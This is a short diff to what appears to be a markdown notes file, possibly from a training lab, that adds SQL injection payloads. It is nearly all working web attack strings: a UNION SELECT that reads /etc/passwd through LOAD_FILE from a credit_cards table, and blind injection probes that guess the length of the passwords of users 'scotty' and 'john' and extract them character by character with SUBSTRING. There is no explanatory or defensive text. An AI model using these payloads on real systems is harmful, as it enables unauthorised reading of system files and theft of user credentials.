@@ -59,3 +59,17 @@ sys.stdout.buffer.write(payload)
 ```commandline
 ' union select null, LOAD_FILE('/etc/passwd'), null,null,null,null,null from credit_cards where ccnumber=1234567812345678 -- 
 ```
+```commandline
+scotty' AND password=(SELECT password FROM accounts WHERE username = 'scotty') -- 
+```
+```commandline
+' OR LENGTH((SELECT password FROM accounts WHERE username='scotty'))=8 -- 
+```
+```commandline
+john' AND LENGTH(password)=6; -- 
+```
+```commandline
+john' AND SUBSTRING(password,-6,1)='m'; -- 
+john' AND SUBSTRING(password,-6,1)='m' AND SUBSTRING(password,-5,1)='o'; -- 
+john' AND SUBSTRING(password,-6,1)='m' AND SUBSTRING(password,-5,1)='o' AND SUBSTRING(password,-4,1)='n'; --
+```
